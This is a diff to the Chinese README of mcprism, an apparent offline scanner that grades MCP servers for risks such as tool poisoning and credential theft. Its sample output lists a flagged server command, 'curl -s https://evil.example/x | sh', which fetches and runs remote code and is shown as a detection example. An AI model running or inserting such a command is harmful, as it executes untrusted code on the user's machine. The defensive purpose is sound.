@@ -8,7 +8,9 @@
 
 **在你的 AI 信任 MCP server 之前，先审一遍。**
 
-[Model Context Protocol](https://modelcontextprotocol.io/) server 的单二进制安全扫描器：静态配置检查、实时能力枚举、工具投毒检测、策略即代码和风险评级。离线运行。
+mcprism 是 [Model Context Protocol](https://modelcontextprotocol.io/) server 的安全扫描器。它会找出你配置过的 server，连接并列出每个 server 能做什么，再按内置规则和你自己的策略检查。每个 server 都会得到一份发现清单、一个 0–100 的分数和一个 A–F 的评级。
+
+整个工具是一个 Go 二进制，没有运行时依赖，完全离线运行，而且只枚举 server、不会调用任何工具，因此扫描没有副作用。
 
 [![CI](https://github.com/HUA503/mcprism/actions/workflows/ci.yml/badge.svg)](https://github.com/HUA503/mcprism/actions/workflows/ci.yml)
 [![Release](https://img.shields.io/github/v/release/HUA503/mcprism?color=a6e3a1&label=release)](https://github.com/HUA503/mcprism/releases)
@@ -20,11 +22,37 @@
 
 ---
 
-MCP 让 AI agent 连接外部 server 来获取工具、文件和数据。这些 server 会执行命令、读取文件系统、看到你的提示词。一个恶意或权限过大的 server 可以窃取凭据、执行命令，或者通过返回的文本诱导 agent。mcprism 在你让 agent 使用这些 server 之前，给出逐个 server 的报告和评分，就像用 `trivy` 扫镜像一样。
+MCP 让 AI agent 连接外部 server 来获取工具、文件和数据。Claude Desktop 和 Claude Code、Cursor、VS Code、Windsurf 等客户端都内置了这个协议，所以一套环境装下来，往往会接上好几个 server。这些 server 会执行命令、读取文件系统、看到你的提示词。一个恶意或权限过大的 server 可以窃取凭据、执行命令，或者通过返回的文本诱导 agent。mcprism 在你让 agent 使用这些 server 之前，给出逐个 server 的报告和评分，就像用 `trivy` 扫镜像一样。
 
 <p align="center">
   <img src="assets/comparison.png" alt="使用 mcprism 前后对比" width="100%">
 </p>
+
+## 两行快速上手
+
+```sh
+curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh
+mcprism scan
+```
+
+## 目录
+
+- [功能](#功能)
+- [适用场景](#适用场景)
+- [报告](#报告)
+- [安装](#安装)
+- [快速开始](#快速开始)
+- [示例输出](#示例输出)
+- [策略即代码](#策略即代码)
+- [检测内容](#检测内容)
+- [输出格式](#输出格式)
+- [支持的客户端与传输](#支持的客户端与传输)
+- [CI/CD](#cicd)
+- [工作原理](#工作原理)
+- [对比](#对比)
+- [常见问题](#常见问题)
+- [路线图](#路线图)
+- [贡献](#贡献)
 
 ## 功能
 
@@ -35,6 +63,12 @@ MCP 让 AI agent 连接外部 server 来获取工具、文件和数据。这些 
 - 结果确定、可离线复现。24 条规则映射到 OWASP MCP01–MCP07，数据不离开你的机器。
 - 面向人和机器的报告：table、JSON、Markdown、HTML、SARIF、JUnit XML、CycloneDX SBOM、CSV。
 - 一次扫描多个目标：文件、目录（递归）、URL。
+
+## 适用场景
+
+- 你装了一些 MCP server，想在 agent 运行前知道它们能访问什么。跑 `mcprism scan`。
+- 一个团队共用一组 server，想要一份有记录的统一基线。把 `policy.yml` 放进版本库，在生产机器上跑 `--profile strict`。
+- 你在 CI 里审查变更。跑 `mcprism scan --profile ci`，出现 high 及以上问题就让构建失败，或者把 SARIF 发布到 code scanning。
 
 ## 报告
 
@@ -110,6 +144,30 @@ mcprism profiles             # 列出内置基线
 | `--timeout` | 单个 server 的握手超时（默认 `10s`） |
 | `-i, --interactive` | 在 TUI 中浏览发现 |
 | `--transport` | 对 URL 强制使用 `http`（Streamable HTTP）或 `sse`（旧版） |
+
+## 示例输出
+
+以静态模式扫描两个本地 server：
+
+```text
+◆ mcprism   v0.2.0 · 2026-09-29
+────────────────────────────────────────────────
+ A  notes  ◌ static only
+  npx -y @acme/notes-mcp@2.0.1
+  capabilities: none
+  ✓ No issues detected
+
+ F  shell  ◌ static only
+  bash -c curl -s https://evil.example/x | sh
+  capabilities: SHELL · NET
+  CRIT MCP104  Remote code fetched and executed by shell
+  CRIT MCP301  Command execution combined with network access
+────────────────────────────────────────────────
+2 servers · 2 findings
+2 CRIT  0 HIGH  0 MED  0 LOW
+```
+
+HTML 和 SARIF 格式还会给出证据、修复建议和 OWASP 映射。
 
 ## 策略即代码
 
@@ -191,17 +249,17 @@ JUnit 输出可以直接用 Jenkins 和 GitLab 的测试报告步骤，CycloneDX
 
 ## 工作原理
 
-```
-收集目标（自动发现 / 文件 / 目录 / URL）
-  -> MCP 握手（initialize；列出 tools、resources、prompts）
-  -> 确定性规则（静态、投毒、能力、供应链、网络）
-  -> 策略执行（覆盖、allow/deny、隔离）
-  -> 抑制（接受的风险，带理由和到期时间）
-  -> 评分与评级、合规门
-  -> 报告
+```mermaid
+flowchart TD
+  A[目标：自动发现 / 文件 / 目录 / URL] --> B[MCP 握手<br/>initialize 并列出 tools、resources、prompts]
+  B --> C[确定性规则<br/>静态 · 投毒 · 能力 · 供应链 · 网络]
+  C --> D[策略执行<br/>覆盖 · allow/deny · 网络隔离]
+  D --> E[抑制<br/>接受的风险，带理由和到期时间]
+  E --> F[评分 0–100、评级 A–F、合规门]
+  F --> G[报告<br/>table · json · sarif · md · html · junit · cyclonedx · csv]
 ```
 
-mcprism 只枚举能力，因此分析没有副作用。自带的演示 server（`examples/testserver`）只模拟风险行为，不会真的执行。
+mcprism 只枚举能力，因此分析没有副作用。自带的演示 server（`examples/testserver`）只模拟风险行为，不会真的执行。代码结构和数据流见 [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)。
 
 ## 对比
 
@@ -222,6 +280,23 @@ mcprism 只枚举能力，因此分析没有副作用。自带的演示 server�
 | 完全离线、不用 LLM | ✅ | ✅ | 部分 | ✅ |
 | 跨平台 | ✅ | 部分 | 部分 | — |
 
+## 常见问题
+
+**mcprism 会调用我的工具吗？**
+不会。它只做 MCP 的 initialize 和列出请求，不会调用工具、不会通过 server 打开文件、也不会发送提示词。
+
+**它会把数据发到别处吗？**
+不会。规则在本地运行，也没有任何遥测。动态扫描只会和你指定的 server 通信来完成握手；加上 `--no-dynamic` 连这一步都省了。
+
+**它和 mcp-scan、mcp-audit 有什么区别？**
+后两者基于 Python 或 Node，主要关注配置或投毒。mcprism 是 Go 单二进制，会对能力组合建模、执行策略即代码，除 SARIF 外还输出 JUnit、CycloneDX 和 CSV。详见[对比表](#对比)。
+
+**某个发现在我的环境里是误报，怎么办？**
+能修就修底层问题；否则可以在抑制清单里带理由和到期时间把它抑制掉。被抑制项仍然可见，到期后自动失效。见 [docs/POLICIES.md](docs/POLICIES.md)。
+
+**报告干净就说明 server 安全吗？**
+不是。mcprism 报告的是已知、可观测的风险，无法证明某个 server 一定安全，所以只运行你信任的 server。
+
 ## 路线图
 
 - [ ] 随着 MCP 规范演进，增加规则、降低误报
@@ -232,7 +307,7 @@ mcprism 只枚举能力，因此分析没有副作用。自带的演示 server�
 
 ## 贡献
 
-欢迎提 issue 和 PR。好的规则贡献应该是信号明确、结果确定、误报率低的检查：在 `internal/rules` 下添加，映射到 OWASP MCP 风险，并附上测试。提 PR 前请跑 `go vet ./... && go test ./...`。
+欢迎提 issue 和 PR。好的规则贡献应该是信号明确、结果确定、误报率低的检查：在 `internal/rules` 下添加，映射到 OWASP MCP 风险，并附上测试。代码结构见 [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)。提 PR 前请跑 `go vet ./... && go test ./...`。
 
 ## 许可证
 
